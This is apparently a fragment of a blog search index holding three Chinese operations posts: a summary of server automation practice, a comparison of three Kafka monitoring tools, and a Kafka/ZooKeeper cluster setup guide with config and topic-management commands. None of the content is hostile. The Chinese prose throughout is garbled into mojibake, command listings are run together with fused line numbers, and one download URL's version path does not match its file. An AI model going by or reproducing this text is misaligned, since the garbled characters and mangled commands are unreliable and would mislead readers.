å…¬å¸æœåŠ¡å™¨150å°æœåŠ¡è‡ªåŠ¨åŒ–å‘å¸ƒã€‚åé¢è¿ç»´å¼€å‘å¼€å‘äº†ä¸€å¥—åŸºäºsaltè‡ªåŠ¨åŒ–ä¸€å¥—webç‰ˆçš„ç®¡ç†å¹³å°ã€‚å¯¹æˆ‘ä»¬åé¢çš„åšéƒ¨ç½²åˆå§‹åŒ–çš„ç¡®å‡è½»äº†å¾ˆå¤šã€‚ç°åœ¨å¼€å§‹å…¬å¸ç”¨çš„æ˜¯ansibleåŸºpythonå¼€å‘å‡ºæ¥ä¸€å¥—è‡ªåŠ¨åŒ–éƒ¨ç½²çš„ã€‚å‘å¸ƒéƒ¨ç½²æµ‹è¯•ä¸€ä½“ç³»ï¼šåˆšå¼€å‘å‡ºæ¥çš„æˆªäº†ä¸€å¼ å›¾ï¼š ä¸ªäººæ€»ç»“ï¼šç³»ç»Ÿæ ‡å‡†åŒ–ï¼šè¦æƒ³è‡ªåŠ¨åŒ–ï¼Œé¦–å…ˆç¬¬ä¸€å°±æ˜¯æ ‡å‡†åŒ–ã€‚æ¯”å¦‚è½¯ä»¶çš„å®‰è£…ä½ç½®ã€ç‰ˆæœ¬ã€è„šæœ¬ï¼Œæ³¨å†Œåˆ°init.dä¸‹é¢ï¼Œè¿™äº›åº”è¯¥æ˜¯æ ‡å‡†çš„ï¼Œæ‰€æœ‰æœåŠ¡å™¨éƒ½ç»Ÿä¸€çš„ã€‚æˆ–è€…è¯´ä½ ä½¿ç”¨saltå°±æ˜¯ä¸ºäº†è¾¾åˆ°è¿™æ ·çš„æ ‡å‡†åŒ–åšè‡ªåŠ¨åŒ–è¿ç»´è¦ç»å†çš„æ ‡å‡†åŒ–â€“&gt;&gt;è‡ªåŠ¨åŒ–â€”-&gt;&gt;æœåŠ¡åŒ–â€”-&gt;&gt;æ•°æ®åŒ–ã€‚ ä¸ªäººæ„è§ï¼š åªæœ‰æ ‡å‡†äº†ï¼Œæ‰èƒ½è‡ªåŠ¨ï¼Œè‡³å°‘ä½ ç›¸åŒçš„ä¸šåŠ¡éƒ½åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚ è‡ªåŠ¨åŒ–ï¼Œè¿™ä¸ªè‡ªåŠ¨åŒ–è®²çš„æ˜¯å·¥å…·ï¼Œæ‰€æœ‰çš„æ“ä½œæ˜¯å·¥å…·å†åšï¼Œä¸æ˜¯äººã€‚ä¹Ÿæœ‰å°å…¬å¸è¯´æˆ‘ä»¬åŠè‡ªåŠ¨ï¼Œçš„ç¡®æ˜¯æœ‰çš„ï¼Œå°±å†™å†™è„šæœ¬ç„¶åé å·¥å…·å»ç®¡ç†ã€‚ æœåŠ¡åŒ–ï¼Œä½ å¹³å°æçš„å¾ˆç‰›é€¼äº†ï¼Œç›´æ¥ç»™ä¸šåŠ¡æä¾›æ¥å£ã€‚DNSã€è´Ÿè½½å‡è¡¡ã€åˆ†å¸ƒå¼å­˜å‚¨ã€ä½ éƒ½å°è£…å¥½äº†ï¼Œä¸Šå±‚ä¸éœ€è¦å…³å¿ƒï¼Œä½ ç›¸å½“äºä¸ºä¸Šå±‚æœåŠ¡æä¾›æœåŠ¡ã€‚å„ç§APIéƒ½å†™å¥½äº†ã€‚ æ•°æ®åŒ–ï¼Œæˆ–è€…è¯´å¯è§†åŒ–ï¼Œè¿ç»´å¹³å°åšçš„å¾ˆç‰›é€¼ï¼Œç›´æ¥å¯¹ä¸šåŠ¡è´Ÿè´£ï¼Œä»¥ä¸šåŠ¡ä¸ºå¯¼å‘ï¼Œä»Šå¤©è®¢å•é‡å‡å°‘äº†ï¼Œé€šè¿‡ä½ çš„è¿ç»´å¹³å°ï¼Œç›´æ¥å®šä½é—®é¢˜ï¼Œä¸éœ€è¦å„ç§æŸ¥æ‰¾ï¼Œå› ä¸ºè®¢å•é‡çš„å‡å°‘ï¼Œè‚¯å®šæœ‰ç›¸å…³çš„ç›‘æ§æŒ‡æ ‡å‘ç”Ÿå˜åŒ–ã€‚ é‚£ä¹ˆåœ¨å·¥å…·è‡ªåŠ¨åŒ–å»ºè®¾çš„å¼€å§‹ï¼Œä½ éœ€è¦æœ‰ä¸€ä¸ªç†è®ºæ”¯æŒï¼Œæ¯”å¦‚ITILã€‚ä¸èƒ½çæã€‚æ²¡æœ‰æµç¨‹çš„è‡ªåŠ¨åŒ–è¿ç»´å°±æ˜¯è€æµæ°“å¦‚æœä¸Šçº¿æ²¡æœ‰èµ°ä¸Šçº¿æµç¨‹ï¼ŒåŠ¨ä¸åŠ¨ï¼Œå¼€å‘è‡ªå·±ç™»å½•æœåŠ¡å™¨æ‰§è¡Œäº†git pullã€‚é‚£è¿˜è‡ªåŠ¨åŒ–ä»€ä¹ˆå‘¢ã€‚ æˆ‘ä¸ªäººçš„æ¦‚å¿µå°±æ˜¯ç”Ÿäº§å°±æ˜¯å’±ä»¬è¿ç»´çš„åœ°ç›˜ã€‚è°éƒ½ä¸èƒ½åŠ¨ã€‚å¼€å‘æƒ³åŠ¨ï¼Œä½ å¯ä»¥æä¾›æ¥å£ï¼Œæˆ–è€…æä¾›å¹³å°è®©å¼€å‘ç‚¹ç‚¹é¼ æ ‡å°±å¯ä»¥äº†ã€‚ é¢˜å¤–è¯ï¼šè¯´ä¸ªå¾ˆè›‹ç–¼çš„äº‹æƒ…ï¼Œä¹‹å‰åˆšæ¥è¿™è¾¹è´Ÿè´£ç¾å¹´å¤§æ–°çš„è¿ç»´å›¢é˜Ÿï¼ŒæŠ€æœ¯å›¢é˜Ÿå¼€å‘äººå‘˜éƒ½å¯ä»¥éšä¾¿è¦æƒé™ï¼Œç„¶åè§£å†³é—®é¢˜è¿ç»´ä¸ç”¨å‚ä¸éƒ½æ˜¯å¼€å‘å»æ“ä½œã€‚æ‰€ä»¥åæ¥æŠŠå…¬å¸è¿ç»´æ•´æ”¹ï¼šè¿ç»´ä¹‹é—´æƒé™è¿™äº›éƒ½æ˜¯é¿å…äº†ã€‚ç»Ÿä¸€ç®¡ç†ï¼Œç»Ÿä¸€åˆ†é…ï¼Œä¸åŒéƒ¨é—¨ï¼Œä¸åŒå²—ä½ï¼Œä¸åŒæƒé™ã€‚ è¿™é‡Œæˆ‘å†™è¿‡ä¸€ç¯‡æ–‡ç« ï¼šä¸­å°å…¬å¸å‘˜å·¥ç»Ÿä¸€ç”¨æˆ·è®¤è¯æ–¹æ¡ˆ è¿™ä¸ªæ˜¯è‡ªåŠ¨åŒ–é‡Œé¢æœ€å¸¸è§çš„éƒ¨ç½²è‡ªåŠ¨åŒ–ï¼Œå¯¹äºITILçš„æµç¨‹å°±æ˜¯å‘å¸ƒä¸éƒ¨ç½²ç®¡ç†ã€‚æ„å»º---æ‰“åŒ…---æµ‹è¯•---å‘å¸ƒéƒ½éœ€è¦æ˜¯è‡ªåŠ¨çš„ï¼›æ‰€ä»¥è¿™å—éœ€è¦æµ‹è¯•çš„æ”¯æŒã€‚éœ€è¦æœ‰è‡ªåŠ¨åŒ–æµ‹è¯•ã€‚æ²¡æœ‰å°±å¡åˆ°æµ‹è¯•äº†ã€‚æœ€ç®€å•çš„å°±æ˜¯å‘å¸ƒæµç¨‹å’Œå¼€å‘æµç¨‹åˆ†å¼€ã€‚ è‡ªåŠ¨åŒ–è¿ç»´å‡è½»äº†å¾ˆå¤šçš„äº‹æƒ…ï¼Œä¹Ÿè®©æ›´å¤šçš„è¿ç»´å°ä¼™ä¼´å¯ä»¥ç ”ç©¶æ›´å¤šçš„çŸ¥è¯†ã€‚è¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯è‡ªå·±å¯¹è¿™ä¸¤å¹´å¤šè¿ç»´çš„è¿™ä¸€æ–¹é¢çš„è‡ªåŠ¨åŒ–è¿ç»´çš„æ€»ç»“ã€‚","link":"/2017/03/14/è¿ç»´ç¬”è®°/è¿ç»´è‡ªåŠ¨åŒ–æ€»ç»“-è®°å½•å¸®åŠ©å…¬å¸è‡ªåŠ¨åŒ–æ¶æ„æ¼”å˜è¿‡ç¨‹/"},{"title":"Bigdata-Kafkaä¸‰æ¬¾ç›‘æ§å·¥å…·æ¯”è¾ƒ","text":"åœ¨ä¹‹å‰çš„åšå®¢ä¸­ï¼Œä»‹ç»äº†Kafka Web Consoleè¿™ä¸ªç›‘æ§å·¥å…·ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œè¿è¡Œä¸€æ®µæ—¶é—´åï¼Œå‘ç°è¯¥å·¥å…·ä¼šå’ŒKafkaç”Ÿäº§è€…ã€æ¶ˆè´¹è€…ã€ZooKeeperå»ºç«‹å¤§é‡è¿æ¥ï¼Œä»è€Œå¯¼è‡´ç½‘ç»œé˜»å¡ã€‚å¹¶ä¸”è¿™ä¸ªBugä¹Ÿåœ¨å…¶ä»–ä½¿ç”¨è€…ä¸­å‡ºç°è¿‡ï¼Œçœ‹æ¥ä½¿ç”¨å¼€æºå·¥å…·è¦æ…é‡ï¼è¯¥Bugæš‚æœªå¾—åˆ°ä¿®å¤ï¼Œä¸å¾—å·²ï¼Œåªèƒ½ç ”ç©¶ä¸‹å…¶ä»–åŒç±»çš„Kafkaç›‘æ§è½¯ä»¶ã€‚ é€šè¿‡ç ”ç©¶ï¼Œå‘ç°ä¸»æµçš„ä¸‰ç§kafkaç›‘æ§ç¨‹åºåˆ†åˆ«ä¸ºï¼š 1ã€Kafka Web Conslole 2ã€Kafka Manager 3ã€KafkaOffsetMonitor ç°åœ¨ä¾æ¬¡ä»‹ç»ä»¥ä¸Šä¸‰ç§å·¥å…·ï¼š 1ã€Kafka Web Consloleä½¿ç”¨Kafka Web Consoleï¼Œå¯ä»¥ç›‘æ§ï¼š Brokersåˆ—è¡¨ Kafka é›†ç¾¤ä¸­ Topicåˆ—è¡¨ï¼ŒåŠå¯¹åº”çš„Partitionã€LogSiz eç­‰ä¿¡æ¯ ç‚¹å‡»Topicï¼Œå¯ä»¥æµè§ˆå¯¹åº”çš„Consumer Groupsã€Offsetã€Lagç­‰ä¿¡æ¯ ç”Ÿäº§å’Œæ¶ˆè´¹æµé‡å›¾ã€æ¶ˆæ¯é¢„è§ˆâ€¦ ç¨‹åºè¿è¡Œåï¼Œä¼šå®šæ—¶å»è¯»å–kafkaé›†ç¾¤åˆ†åŒºçš„æ—¥å¿—é•¿åº¦ï¼Œè¯»å–å®Œæ¯•åï¼Œè¿æ¥æ²¡æœ‰æ­£å¸¸é‡Šæ”¾ï¼Œä¸€æ®µæ—¶é—´åäº§ç”Ÿå¤§é‡çš„socketè¿æ¥ï¼Œå¯¼è‡´ç½‘ç»œå µå¡ã€‚ 2ã€Kafka Manageré›…è™å¼€æºçš„Kafkaé›†ç¾¤ç®¡ç†å·¥å…·: ç®¡ç†å‡ ä¸ªä¸åŒçš„é›†ç¾¤ ç›‘æ§é›†ç¾¤çš„çŠ¶æ€(topics, brokers, å‰¯æœ¬åˆ†å¸ƒ, åˆ†åŒºåˆ†å¸ƒ) äº§ç”Ÿåˆ†åŒºåˆ†é…(Generate partition assignments)åŸºäºé›†ç¾¤çš„å½“å‰çŠ¶æ€ é‡æ–°åˆ†é…åˆ†åŒº 3ã€KafkaOffsetMonitor KafkaOffsetMonitorå¯ä»¥å®æ—¶ç›‘æ§ï¼š Kafkaé›†ç¾¤çŠ¶æ€ Topicã€Consumer Groupåˆ—è¡¨ å›¾å½¢åŒ–å±•ç¤ºtopicå’Œconsumerä¹‹é—´çš„å…³ç³» å›¾å½¢åŒ–å±•ç¤ºconsumerçš„Offsetã€Lagç­‰ä¿¡æ¯ æ€»ç»“é€šè¿‡ä½¿ç”¨ï¼Œä¸ªäººæ€»ç»“ä»¥ä¸Šä¸‰ç§ç›‘æ§ç¨‹åºçš„ä¼˜ç¼ºç‚¹ï¼š Kafka Web Consoleï¼šç›‘æ§åŠŸèƒ½è¾ƒä¸ºå…¨é¢ï¼Œå¯ä»¥é¢„è§ˆæ¶ˆæ¯ï¼Œç›‘æ§Offsetã€Lagç­‰ä¿¡æ¯ï¼Œä½†å­˜åœ¨bugï¼Œä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ã€‚ Kafka Managerï¼šåå‘Kafkaé›†ç¾¤ç®¡ç†ï¼Œè‹¥æ“ä½œä¸å½“ï¼Œå®¹æ˜“å¯¼è‡´é›†ç¾¤å‡ºç°æ•…éšœã€‚å¯¹Kafkaå®æ—¶ç”Ÿäº§å’Œæ¶ˆè´¹æ¶ˆæ¯æ˜¯é€šè¿‡JMXå®ç°çš„ã€‚æ²¡æœ‰è®°å½•Offsetã€Lagç­‰ä¿¡æ¯ã€‚ KafkaOffsetMonitorï¼šç¨‹åºä¸€ä¸ªjaråŒ…çš„å½¢å¼è¿è¡Œï¼Œéƒ¨ç½²è¾ƒä¸ºæ–¹ä¾¿ã€‚åªæœ‰ç›‘æ§åŠŸèƒ½ï¼Œä½¿ç”¨èµ·æ¥ä¹Ÿè¾ƒä¸ºå®‰å…¨ã€‚ è‹¥åªéœ€è¦ç›‘æ§åŠŸèƒ½ï¼Œæ¨èä½¿ç”¨KafkaOffsetMonitoï¼Œè‹¥åé‡Kafkaé›†ç¾¤ç®¡ç†ï¼Œæ¨èä½¿ç”¨Kafka Managerã€‚ å› ä¸ºéƒ½æ˜¯å¼€æºç¨‹åºï¼Œç¨³å®šæ€§æ¬ ç¼ºã€‚æ•…éœ€å…ˆäº†è§£æ¸…æ¥šç›®å‰å·²å­˜åœ¨å“ªäº›Bugï¼Œå¤šæµ‹è¯•ä¸€ä¸‹ï¼Œé¿å…å‡ºç°ç±»ä¼¼äºKafka Web Consoleçš„é—®é¢˜ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/04/29/Bigdata-hadoop/Kafka/Bigdata-Kafkaä¸‰æ¬¾ç›‘æ§å·¥å…·æ¯”è¾ƒ/"},{"title":"Bigdata-Kafkaé›†ç¾¤å¿«é€Ÿæ­å»ºä¸å¢åˆ æ”¹æŸ¥å‘½ä»¤è®²è§£","text":"Bigdata-Kafkaé›†ç¾¤å¿«é€Ÿæ­å»ºä¸å¢åˆ æ”¹æŸ¥å‘½ä»¤è®²è§£ kafkaé›†ç¾¤å’Œzookeeperé›†ç¾¤è§„èŒƒ12345678910111213141516171819kafkaé›†ç¾¤å’Œzookeeperé›†ç¾¤è§„èŒƒkafkaç‰ˆæœ¬ï¼škafka_2.10-0.8.2.1zookeeperç‰ˆæœ¬ï¼šzookeeper-3.4.5å¯åŠ¨ç”¨æˆ·ï¼šjollybikafkaå®‰è£…ç›®å½•ï¼š/data/tools/kafkaæ–°å»ºæ¶ˆæ¯ç›®å½•ï¼š/data/tools/kafka_2.10-0.8.2.1/kafka-logså¯åŠ¨ç”¨æˆ·ï¼šjollybizookeeperå®‰è£…ç›®å½•ï¼š/data/tools/zookeeperæ–°å»ºæ—¥å¿—ç›®å½•ï¼š/data/tools/zookeeper-3.4.5/tmp/logsç»Ÿä¸€é…ç½®hosts10.155.90.153 kafka1.jollychic.com kafka110.155.90.155 kafka2.jollychic.com kafka210.155.90.138 kafka3.jollychic.com kafka3 æœ¬æ–‡ä½¿ç”¨äº†3å°æœºå™¨éƒ¨ç½²Kafkaé›†ç¾¤ï¼ŒIPå’Œä¸»æœºåå¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š 12310.155.90.153 kafka1.jollychic.com kafka110.155.90.155 kafka2.jollychic.com kafka210.155.90.138 kafka3.jollychic.com kafka3 Step1: é…ç½®/etc/hosts ï¼ˆ3å°ä¸€è‡´ï¼‰1234127.0.0.1 localhost.localdomain localhost10.155.90.153 kafka1.jollychic.com kafka110.155.90.155 kafka2.jollychic.com kafka210.155.90.138 kafka3.jollychic.com kafka3 Step2: ç¯å¢ƒKafKaé›†ç¾¤ç¯å¢ƒ123ä¸‹è½½åœ°å€ï¼šhttp://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.8.2.1.tgz[jollybi@kafka1 ]# tar -xvf kafka_2.10-0.8.2.1.tgz -C /data/tools/cd /data/tools/kafka_2.10-0.8.2.1/config è®¾ç½®dataç›®å½•ï¼Œæœ€å¥½ä¸è¦ç”¨é»˜è®¤çš„/tmp/kafka-logs1mkdir -p /data/tools/kafka_2.10-0.8.2.1/kafka-logs/ ä¿®æ”¹kafkaé…ç½®æ–‡ä»¶ 1234567891011121314151617181920[root@kafka_01 config]# vim server.properties è®¾ç½®brokeridï¼ˆä»0å¼€å§‹ï¼Œ3ä¸ªèŠ‚ç‚¹åˆ†åˆ«è®¾ä¸º1,2,3ï¼Œä¸èƒ½é‡å¤ï¼‰åœ¨è¿™é‡Œid=0è·Ÿzookeeper idè®¾ç½®ä¸€æ ·å°±è¡Œã€‚ é›†ç¾¤æœºå™¨ï¼šæŒ‰é¡ºåºå†™1broker.id=1 auto.leader.rebalance.enable=true #ä¿®æ”¹æœ¬åœ°IPåœ°å€ï¼šlisteners=PLAINTEXT://10.46.72.172:9092port=9292 //è®¾ç½®è®¿é—®ç«¯å£host.name=10.155.90.153 kafkaæœ¬æœºIPlog.dirs=/data/tools/kafka_2.10-0.8.2.1/kafka-logs#è®¾ç½®æ³¨å†Œåœ°å€ï¼ˆé‡è¦ï¼Œé»˜è®¤ä¼šæŠŠæœ¬æœºçš„hostanmeæ³¨å†Œåˆ°zkä¸­ï¼Œå®¢æˆ·ç«¯è¿æ¥æ—¶éœ€è¦è§£æè¯¥hostanmeï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æ³¨å†Œæœ¬æœºçš„IPåœ°å€ï¼Œé¿å…hostnameè§£æå¤±è´¥ï¼ŒæŠ¥é”™java.nio.channels.UnresolvedAddressExceptionæˆ–java.io.IOException: Can not resolve addressï¼‰#è®¾ç½®zookeeperåœ°å€#zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181zookeeper.connect=kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281//è¿™é‡Œæˆ‘è®¾ç½®hostsä»£æ›¿IP é…ç½®zookeeperåœ°å€ 1234567vim zookeeper.properties dataDir=/data/tools/zookeeper-3.4.5/tmp# the port at which the clients will connectclientPort=2281# disable the per-ip limit on the number of connections since this is a non-production configmaxClientCnxns=0~ é…ç½®kafkaè®¿é—®åœ°å€ 1234567891011121314vim producer.properties metadata.broker.list=169.44.62.139:9292,169.44.59.138:9292,169.44.62.137:9292 # name of the partitioner class for partitioning events; default partition spreads data randomly#partitioner.class=# specifies whether the messages are sent asynchronously (async) or synchronously (sync)producer.type=sync# specify the compression codec for all data generated: none, gzip, snappy, lz4.# the old config values work as well: 0, 1, 2, 3 for none, gzip, snappy, lz4, respectivelycompression.codec=none# message encoderserializer.class=kafka.serializer.DefaultEncoder Step3: é›†ç¾¤æœºå™¨å¿«é€Ÿæ‹·è´é…ç½®:è¿œç¨‹å¤åˆ¶åˆ†å‘å®‰è£…æ–‡ä»¶æœ€å¥½æ˜¯æŠŠæ–‡ä»¶æ‰“åŒ…scpè¿‡å»æ¥ä¸‹æ¥å°†ä¸Šé¢çš„å®‰è£…æ–‡ä»¶æ‹·è´åˆ°é›†ç¾¤ä¸­çš„å…¶ä»–æœºå™¨ä¸Šå¯¹åº”çš„ç›®å½• 12scp -P58958 -r kafka_2.10-0.8.2.1 jollybi@169.44.62.137:/home/jollybi/tools/. scp -P58958 -r kafka_2.10-0.8.2.1 jollybi@169.44.62.138:/home/jollybi/tools/. ç»Ÿä¸€ä¿®æ”¹åˆ†åˆ«å…¶ä»–ä¸¤å°kafka server.properties 12345broker.id=2 host.name=169.44.62.137 kafka2æœ¬æœºIPbroker.id=3 host.name=169.44.62.138 kafka3æœ¬æœºIP Step4:å¯åŠ¨ kafkaé›†ç¾¤1234567./kafka-server-start.sh -daemon ../config/server.properties[jollybi@kafka1 config]$ jps3443 QuorumPeerMain16280 Jps3628 KafkaStep5: Kafkaå¸¸ç”¨å‘½ä»¤(æ™®åŠ) Step5:æµ‹è¯•é›†ç¾¤åŸºæœ¬å‘½ä»¤12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697### é»˜è®¤åˆ›å»ºkafka Topic: 1ä¸ªå‰¯æœ¬å¤‡ä»½ 1ä¸ªåˆ†åŒºæ¶ˆè´¹./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 1 --partitions 1 --topic mongotail_lz4./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 1 --partitions 1 --topic mongotail_lz4_imp### å¤§æ•°æ®è¿™è¾¹éœ€è¦12ä¸ªåˆ†åŒºè¿™é‡Œæˆ‘åˆ é™¤Topicé‡æ–°åˆ›å»ºTopicï¼š### åˆ é™¤kafka Topic:ç¬¬ä¸€æ­¥ï¼šåˆ é™¤kafka topic./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --delete --topic mongotail_lz4 ./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --delete --topic mongotail_lz4_imp### è¿™æ˜¯ç”±äºåˆ é™¤topicæ²¡åˆ å¹²å‡€ä¼šæŠ¥é”™ï¼šorg.apache.kafka.common.errors.UnknownTopicOrPartitionException: This server does not host this topic-partition.### åˆ é™¤çº¿ç¨‹æ‰§è¡Œåˆ é™¤æ“ä½œçš„çœŸæ­£é€»è¾‘æ˜¯ï¼š1. å®ƒé¦–å…ˆä¼šç»™å½“å‰æ‰€æœ‰brokerå‘é€æ›´æ–°å…ƒæ•°æ®ä¿¡æ¯çš„è¯·æ±‚ï¼Œå‘Šè¯‰è¿™äº›brokerè¯´è¿™ä¸ªtopicè¦åˆ é™¤äº†ï¼Œä½ ä»¬å¯ä»¥æŠŠå®ƒçš„ä¿¡æ¯ä»ç¼“å­˜ä¸­åˆ æ‰äº†2. å¼€å§‹åˆ é™¤è¿™ä¸ªtopicçš„æ‰€æœ‰åˆ†åŒº2.1 ç»™æ‰€æœ‰brokerå‘è¯·æ±‚ï¼Œå‘Šè¯‰å®ƒä»¬è¿™äº›åˆ†åŒºè¦è¢«åˆ é™¤ã€‚brokeræ”¶åˆ°åå°±ä¸å†æ¥å—ä»»ä½•åœ¨è¿™äº›åˆ†åŒºä¸Šçš„å®¢æˆ·ç«¯è¯·æ±‚äº†2.2 æŠŠæ¯ä¸ªåˆ†åŒºä¸‹çš„æ‰€æœ‰å‰¯æœ¬éƒ½ç½®äºOfflineReplicaçŠ¶æ€ï¼Œè¿™æ ·ISRå°±ä¸æ–­ç¼©å°ï¼Œå½“leaderå‰¯æœ¬æœ€åä¹Ÿè¢«ç½®äºOfflineReplicaçŠ¶æ€æ—¶leaderä¿¡æ¯å°†è¢«æ›´æ–°ä¸º-12.3 å°†æ‰€æœ‰å‰¯æœ¬ç½®äºReplicaDeletionStartedçŠ¶æ€2.4 å‰¯æœ¬çŠ¶æ€æœºæ•è·çŠ¶æ€å˜æ›´ï¼Œç„¶åå‘èµ·StopReplicaRequestç»™brokerï¼Œbrokeræ¥åˆ°è¯·æ±‚ååœæ­¢æ‰€æœ‰fetcherçº¿ç¨‹ã€ç§»é™¤ç¼“å­˜ï¼Œç„¶ååˆ é™¤åº•å±‚logæ–‡ä»¶2.5 å…³é—­æ‰€æœ‰ç©ºé—²çš„Fetcherçº¿ç¨‹ ### ç¬¬äºŒæ­¥ï¼šåˆ é™¤zookeeperç›¸å…³çš„è·¯å¾„ï¼š[jollybi@kafka1 zookeeper-3.4.5]$ ./bin/zkCli.sh -server 127.0.0.1:2281 [zk: 127.0.0.1:2281(CONNECTED) 1] rmr /brokers/topics/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 0] rmr /consumers/group_ml_general/offsets/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 1] rmr /consumers/group_ml_general/owners/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 3] rmr /config/topics/mongotail_lz4[zk: 127.0.0.1:2281(CONNECTED) 4] rmr /admin/delete_topics/mongotail_lz4### åˆ é™¤topicä¸Šé¢æ¶ˆè´¹ç»„ åˆ é™¤ ZooKeeper ä¸‹é¢çš„ /consumers/[group_id] è·¯å¾„å°±å¯ä»¥äº†ã€‚ZooKeeper åŸç”ŸAPIåªæ”¯æŒåˆ é™¤ç©ºçš„è·¯å¾„ï¼Œæ‰€ä»¥å»ºè®®ä½ ä½¿ç”¨ curator framework è¿›è¡Œè¿™ä¸ªåˆ é™¤æ“ä½œï¼ŒZkPaths.deleteChildren ä¼šé€’å½’å¼åœ°åˆ é™¤æ•´ä¸ªè·¯å¾„ï¼ˆåŒ…æ‹¬å­è·¯å¾„ï¼‰ã€‚[zk: 127.0.0.1:2281(CONNECTED) 0] rmr /consumers/kafka-node1-imp-group[zk: 127.0.0.1:2281(CONNECTED) 1] rmr /consumers/kafka-node1-group[zk: 127.0.0.1:2281(CONNECTED) 2] rmr /consumers/console-consumer-59053[zk: 127.0.0.1:2281(CONNECTED) 3] rmr /consumers/1ã€è®¾ç½®é…ç½®æ–‡ä»¶å…è®¸åˆ é™¤delete.topic.enable=true é…ç½®æ·»åŠ åˆ° config/server.properties2ã€æ‰§è¡Œåˆ é™¤å‘½ä»¤./bin/kafka-topics.sh --zookeeper localhost:2181 --delete --topic test-topicåœ¨zookeeperä¸­ç¡®è®¤ï¼š åˆ é™¤zookeeperä¸‹/brokers/topics/test-topicèŠ‚ç‚¹ åˆ é™¤zookeeperä¸‹/config/topics/test-topicèŠ‚ç‚¹ åˆ é™¤zookeeperä¸‹/admin/delete_topics/test-topicèŠ‚ç‚¹ consumer çš„è¯ åˆ é™¤groupid ### é‡å¯kafkaé›†ç¾¤### å¤§æ•°æ®kafkaå»ºtopicï¼Œä¸èƒ½å»ºä¸€ä¸ªåˆ†åŒºï¼Œé‚£æ ·ååé‡ä¸Šä¸å»ï¼Œä¸å¤Ÿç”¨ï¼Œæˆ‘ä»¬ä»¥å‰å»ºäº†12ä¸ªåˆ†åŒºçš„### åˆ›å»ºæ–° kafka Topic: 3ä¸ªå‰¯æœ¬ï¼Œ12ä¸ªåˆ†åŒº ./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --create --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --replication-factor 3 --partitions 12 --topic mongotail_lz4_imp### æŸ¥çœ‹åˆ›å»ºçš„Topic:./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic mongotail_lz4./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic mongotail_lz4_imp### æŸ¥çœ‹é›†ç¾¤æƒ…å†µï¼š./kafka_2.10-0.8.2.1/bin/kafka-topics.sh --describe --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281 --topic mongotail_lz4### æ¨¡æ‹Ÿç”Ÿäº§è€…ï¼ˆproducerï¼‰kafkaç”Ÿäº§å®¢æˆ·ç«¯ç”Ÿäº§æ•°æ®å‘½ä»¤ï¼š./bin/kafka-console-producer.sh --broker-list 75.126.39.124:9292,75.126.5.162:9292,75.126.5.178:9292 --topic mongotail_lz4_imp ......my test message 1my test message 2^C### æ¨¡æ‹Ÿæ¶ˆè´¹è€…ï¼ˆconsumerï¼‰kafkaæ¶ˆè´¹å®¢æˆ·ç«¯æ•°æ®å‘½ä»¤ ç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹æ¶ˆæ¯ï¼š ./bin/kafka-console-consumer.sh --zookeeper 75.126.39.124:2281,75.126.5.162:2281,75.126.5.178:2281 --from-beginning** --topic mongotail_lz4_imp......my test message 1my test message 2^C Kafkaå¸¸ç”¨å‘½ä»¤ä»¥ä¸‹æ˜¯kafkaå¸¸ç”¨å‘½ä»¤è¡Œæ€»ç»“ï¼š 123456789101112131415161718192021222324252627282930313233343536371ã€ list topic æ˜¾ç¤ºæ‰€æœ‰topic./bin/kafka-topics.sh --list --zookeeper kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:22812ã€ 